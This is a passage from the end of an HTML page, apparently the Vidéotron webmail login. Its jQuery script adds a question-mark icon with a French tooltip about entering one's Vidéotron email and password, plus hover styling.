				$("#usernameLabelID").after("<svg xmlns='http://www.w3.org/2000/svg' version='1.0' id='question-mark-icon' width='15' height='15' viewBox='0 0 200 200' style='margin-bottom: -2px;'>"+
											"<path id='path2382' d='m165.33 113.44a103.61 103.61 0 1 1 -207.22 0 103.61 103.61 0 1 1 207.22 0z' transform='matrix(.93739 0 0 .93739 42.143 -6.3392)' stroke-width='0' fill='#fff'></path>"+
											"<g id='layer1'>"+
											"<path id='path2413' d='m100 0c-55.2 0-100 44.8-100 100-5.0495e-15 55.2 44.8 100 100 100s100-44.8 100-100-44.8-100-100-100zm0 12.812c48.13 0 87.19 39.058 87.19 87.188s-39.06 87.19-87.19 87.19-87.188-39.06-87.188-87.19 39.058-87.188 87.188-87.188zm1.47 21.25c-5.45 0.03-10.653 0.737-15.282 2.063-4.699 1.346-9.126 3.484-12.876 6.219-3.238 2.362-6.333 5.391-8.687 8.531-4.159 5.549-6.461 11.651-7.063 18.687-0.04 0.468-0.07 0.868-0.062 0.876 0.016 0.016 21.702 2.687 21.812 2.687 0.053 0 0.113-0.234 0.282-0.937 1.941-8.085 5.486-13.521 10.968-16.813 4.32-2.594 9.808-3.612 15.778-2.969 2.74 0.295 5.21 0.96 7.38 2 2.71 1.301 5.18 3.361 6.94 5.813 1.54 2.156 2.46 4.584 2.75 7.312 0.08 0.759 0.05 2.48-0.03 3.219-0.23 1.826-0.7 3.378-1.5 4.969-0.81 1.597-1.48 2.514-2.76 3.812-2.03 2.077-5.18 4.829-10.78 9.407-3.6 2.944-6.04 5.156-8.12 7.343-4.943 5.179-7.191 9.069-8.564 14.719-0.905 3.72-1.256 7.55-1.156 13.19 0.025 1.4 0.062 2.73 0.062 2.97v0.43h21.598l0.03-2.4c0.03-3.27 0.21-5.37 0.56-7.41 0.57-3.27 1.43-5 3.94-7.81 1.6-1.8 3.7-3.76 6.93-6.47 4.77-3.991 8.11-6.99 11.26-10.125 4.91-4.907 7.46-8.26 9.28-12.187 1.43-3.092 2.22-6.166 2.46-9.532 0.06-0.816 0.07-3.03 0-3.968-0.45-7.043-3.1-13.253-8.15-19.032-0.8-0.909-2.78-2.887-3.72-3.718-4.96-4.394-10.69-7.353-17.56-9.094-4.19-1.062-8.23-1.6-13.35-1.75-0.78-0.023-1.59-0.036-2.37-0.032zm-10.908 103.6v22h21.998v-22h-21.998z'></path>"+
											"</g>"+
											"</svg>"+
											"<span data-i18n='tooltip_text' class='tooltiptext'>"+"Entrez votre adresse courriel de Vidéotron (ex. : votreadresse@videotron.ca) et votre mot de passe Courriel Web."+"</span>");
															
				$(".tooltiptext").attr('style','visibility: hidden; width: 240px; background-color: white !important; text-align: center; padding: 11px 0 !important; position: absolute; z-index: 1; bottom: '+(locale == 'en'?'73.5%':'75%')+'; left: 100%; margin-left: '+(locale == 'en'?'-236px':'-222px')+' !important; font-size: 12px !important; line-height: 14px !important; font-weight: 400 !important; box-shadow: 0px 4px 22px 0px #00000033; color: #6e6e78;');
				$("#question-mark-icon").hover(function() {
					$(".tooltiptext").css({'visibility': 'visible'});
				}, function() {
					$(".tooltiptext").css({'visibility': 'hidden'});
				});
				$('<style>.tooltiptext::after { content: ""; position: absolute; top: 100%; left: 50%; margin-left: '+'-96px'+'; border-width: 5px; border-style: solid; border-color: white transparent transparent transparent; }</style>').appendTo('head');
			
			});

			$("#alg-search-wrapper").css({"display": "none"});
		</script>

	</body>
</html>
